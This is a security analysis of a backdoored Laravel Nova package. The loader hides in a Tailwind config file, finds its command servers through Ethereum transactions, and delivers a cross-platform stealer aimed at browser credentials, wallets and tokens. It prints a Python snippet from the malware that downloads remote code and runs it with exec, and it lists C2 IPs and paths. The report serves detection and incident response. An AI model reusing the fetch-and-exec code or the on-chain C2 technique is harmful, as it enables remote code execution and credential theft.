The sample comes from a development branch of the Laravel Nova extension package visanduma/nova-two-factor, associated with the PolinRider campaign. This is a PHP package published on Packagist, with more than 700,000 cumulative downloads as of the time of this analysis.
The delivery chain does not embed the C2 address in the sample. The implanted code first queries Ethereum, extracts the IP addresses of two servers from the recipient address of a transaction, and then retrieves the subsequent payload via HTTP. If the attacker wants to switch servers, they only need to send a new transaction on-chain, without having to poison the package again.
The remote payload obtained in this analysis was retrieved through an actual request during this campaign and decoded offline. The decoding only involved XOR, zlib, and base64 transformations, and did not execute any downloaded content. The analysis conclusions are based on static code and remote responses, and there is currently no evidence from victims proving that these theft activities have successfully occurred.

The implanted code is hidden at the end of the configuration file. The first 10 lines of the file contain normal Tailwind configuration, and the 11th line ends normally with };, followed by 507 spaces, after which the code begins to execute. This sequence of spaces can make a narrow window display only what appears to be a normal ending, but it does not change the execution semantics of JavaScript. Assigning a value to module.exports does not terminate module execution. The trigger point is also present in the sample: the development, watch, production, and other scripts in package.json all point to Laravel Mix, while webpack.mix.js passes tailwind.config.js as the configuration path to the PostCSS plugin. Tailwind 3.1.8 reads this configuration through require(userConfigPath) in setupTrackingContext.js, which executes the top-level code of the configuration module.
The loader obtains the current C2 address through Ethereum transactions. The attacker encodes two IPv4 addresses in the transaction recipient address. The sample extracts this information from transactions sent by a fixed sender address, and then downloads the subsequent payload via HTTP. In this way, the attacker can publish a new transaction to update the delivery server address without modifying the configuration file that has already been implanted.
The implanted code first initializes its own global variables and then performs the on-chain query. The query reads the transaction’s to field: after removing the 0x prefix, it is decoded from hexadecimal into 20 bytes. The first 4 bytes represent one IPv4 address, bytes 4 through 8 represent the second, and the remaining 12 bytes are not used by the code. The result actually decoded in this round was 166[.]88[.]134[.]75. The two IP addresses were identical, and the trailing 12 bytes contained the plaintext marker helloipbot!!.

The loader queries candidate transactions around the boundaries of every thousand blocks and extracts the encoded C2 addresses from these transactions. On-chain data shows that this query relies on the attacker maintaining a heartbeat: there is a new transaction near each thousand-block boundary. All 392 transactions retrieved in this round were zero-value transfers with empty calldata, and gasUsed was 21000 for all of them. The only information they carried was the to address itself. The addresses are also changed periodically. The most recent five cycles corresponded to 166[.]88[.]134[.]62, 23[.]27[.]13[.]135, 166[.]88[.]73[.]46, 193[.]247[.]144[.]38, and the current round's 166[.]88[.]134[.]75, respectively.
After the address is resolved, the code sends requests to port 443 of the resolved IP and retrieves the /0x/cls and /0x/ls paths. There is an easily overlooked detail that can be misleading because of the port number: the URL scheme is http:, and http.request is used. Port 443 is only the port number, with no TLS. The two payloads are decoded through a loop-based XOR operation and then passed to the same execution function, where they run in a detached Node child process. The /0x/cls path also gets evaluated once in the current process before spawning the child process; if this evaluation throws an error, exits the process, or fails to return, the subsequent child process may not be reached.
It is worth noting that we used MistTrack to analyze the malicious address 0xa322e5f3d311d3080e6f0121063e9adc2490ef1a, whose initial funding came from FixedFloat.
The two loading paths ultimately correspond to three components. The number of interfaces exceeds the number of components because some interfaces provide the same content through different encodings or fallback paths: the body field in the /0x/clb response and the response body of /0x/cb decode to the same code respectively; /0x/js and the inz field in the response are byte-for-byte identical.
/0x/cls retrieves the remote-control component clb, which contains a Socket.IO command channel and can retrieve and execute Python from an address specified by the operator. The loader cls, which is responsible for obtaining and executing clb, also contains failure reporting logic: once an error occurs, it concatenates os.hostname(), os.userInfo().username, os.type(), and os.release() into text and POSTs it to /verify-human/<marker>.
The inz field in the same response, as well as the copy separately provided by /0x/js, is a reinfection loader inz. It uses multi-layer string encoding, array-state-driven control-flow flattening, and indirect function dispatch for obfuscation. After static expansion, it can be seen that it contains its own on-chain resolution logic, using the same Ethereum sender address and the same to field-to-IPv4 conversion, and independently requests /0x/cls to retrieve the remote-control component. Once obtained, it executes the component in either the current process or a detached child process. The remote-control component clb also has the ability to write itself into the host application's scripts; when the host subsequently loads this code, it re-enters this resolution and loading process.
The /0x/ls path retrieves the Python loading component boot. Static reconstruction shows that boot uploads some environment variables to /snv and starts Python to download subsequent payloads.
url = f'{{GLOBAL_H}}/$/{id}' # id is fixed as '1'
Request._code = urlopen(Request(url, headers=H)).read().decode('utf-8')

When urlopen fails, it falls back to the system curl. The text obtained through both paths is passed directly to exec without any validation.
When these paths were requested during this round, the server returned inconsistent responses. HEAD /$/1 returned 404, while GET /$/1 returned 200 with a 36,485-byte response body. Last-Modified was always equal to the time of that request. Using the same method to request /d/python.zip, /d/python.7z, and /d/7zr.exe, all three returned 500.
The final-stage payload obtained in this round was a 89,149-byte Python script after Base64 decoding and zlib decompression.
The payload targets sensitive data accessible to the execution account. It contains logic for extracting and decrypting login credentials, as well as directly copying data files from wallets, password managers, and development tools. The collection targets in the code are mainly divided into the following five categories.
For browser data, the sample not only copies the original databases, but also contains logic to call Windows DPAPI, macOS Keychain, and Linux Secret Service/KWallet to obtain decryption materials, attempt to recover sensitive fields, and export them in plaintext. Whether this can actually succeed depends on whether the required keys or decryption interfaces are available, access authorization, and whether the browser data format is compatible.
The sample also searches paths such as /mnt/*/Users/*/AppData/... and attempts to read mounted Windows user directories. Therefore, the collection scope may extend to other system partitions accessible to the current account. The content that can actually be read remains subject to the mount status and file permissions.
The collected results are written to a local directory and packaged. The sample reports host information and collection counts to /u/e and reads Telegram upload parameters from the response. It then uploads the archive through /u/f, or calls Telegram sendDocument when the code conditions are met. The upload logic includes retries, host switching, and chunked processing. After a successful upload, it attempts to delete the local archive.
This code also contains two self-imposed restrictions. When the response code is 429, it exits directly. Blocked (BOT) is another one: in a Linux environment that does not match its WSL2 identifier, if the system credential count, extension count, and Firefox profile count are all zero, the sample records this marker and skips the subsequent main collection and upload processes. Before reaching this check, the sample has already performed environment variable export, system credential enumeration, and some directory scanning.
What has been confirmed is a complete delivery chain from build configuration to credential stealer. The entry point is a loader appended to tailwind.config.js, triggered by the frontend build. Resolution does not rely on a domain name; it reads the to address of an Ethereum transaction. The third stage consists of three components: the remote-control component clb, the reinfection loader inz, and the loading component boot, which extends into Python. The endpoint is a stealer covering three platforms, targeting browser credentials, cryptocurrency wallets, password managers, and development credentials.
The risk falls on development machines, build containers, and CI runners that run frontend builds. As long as the project’s build has been executed on that machine, the loader has an opportunity to run; once the stealer executes, browser credentials, wallet files, and GitHub tokens accessible within the execution account’s permission scope may be read.
1. Inspect downstream projects’ composer.lock files to confirm whether visanduma/nova-two-factor falls within malicious versions such as dev-nova5, and verify tailwind.config.js against file hashes from source snapshots of the package at any point in time.
2. Search network records during builds on affected development machines and CI runners. During project builds, the Node process sends JSON-RPC requests to multiple Ethereum RPCs and also sends plaintext HTTP requests to port 443 of bare IP addresses, with a Sec-V header included in the requests.
3. Check whether the process command line contains node -e with a prefix containing global['_V'], as well as Python processes launched by py -c. The directly evaluated path does not create a new process, so checking only for node -e will miss this type of execution.
4. If it is confirmed that a build was successfully executed, treat the host as compromised. In a clean environment, rotate browser master passwords, wallet seed phrases and private keys, GitHub CLI tokens, and other version-control credentials that appeared on the machine, and audit recent access to these accounts.
5. Preserve the composer.lock, local Git objects and reflog, build timestamps, the Node version in use at the time, and the original HTTP request and response. Avoid updating dependencies or rebuilding before the investigation is complete.
6. Block network traffic based on the IPs listed in the IOC section of this article. Do not indiscriminately block Telegram domains, as this is a public service being abused. At the same time, do not stop at IP-based investigation: combine host- and account-level investigation to check whether packaged archives, environment variable export files, and abnormal outbound connection records remain on the build machine.
